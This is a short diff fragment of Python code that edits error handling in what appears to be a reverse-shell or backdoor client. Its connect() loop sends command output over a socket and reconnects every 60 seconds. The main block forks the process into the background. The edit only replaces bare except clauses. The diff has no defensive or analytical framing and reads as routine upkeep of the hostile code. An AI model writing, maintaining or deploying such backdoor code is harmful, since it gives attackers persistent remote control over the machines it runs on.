@@ -285,7 +285,7 @@ def connect():
                 s.send(output.encode())
             
             s.close()
-        except:
+        except Exception as e:
             time.sleep(60)
             continue
 
@@ -295,8 +295,8 @@ if __name__ == '__main__':
         pid = os.fork()
         if pid > 0:
             sys.exit(0)
-    except:
-        pass
+    except Exception as e:
+        print("Error occurred")
     
     connect()
 """
